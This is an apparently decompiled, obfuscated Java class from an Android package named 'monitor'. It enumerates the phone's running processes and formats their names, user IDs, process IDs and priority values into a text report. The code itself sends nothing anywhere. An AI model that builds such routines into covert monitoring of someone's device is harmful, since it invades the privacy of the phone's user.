package com.network.android.android.monitor;

import android.app.ActivityManager;
import android.content.Context;
import com.network.android.c.a.a;

public final class b {
    public static StringBuilder a(Context context) {
        try {
            StringBuilder sb = new StringBuilder();
            for (ActivityManager.RunningAppProcessInfo runningAppProcessInfo : ((ActivityManager) context.getSystemService("activity")).getRunningAppProcesses()) {
                try {
                    sb.append("process name: " + runningAppProcessInfo.processName + " uid: " + runningAppProcessInfo.uid + " pid: " + runningAppProcessInfo.pid + " importance: " + runningAppProcessInfo.importance + " importanceReasonPid: " + runningAppProcessInfo.importanceReasonPid + " lru: " + runningAppProcessInfo.lru);
                    sb.append("\r\n");
                } catch (Throwable th) {
                }
            }
            return sb;
        } catch (Throwable th2) {
            a.a("getProcessList Exception- " + th2.getMessage(), th2);
            return null;
        }
    }
}
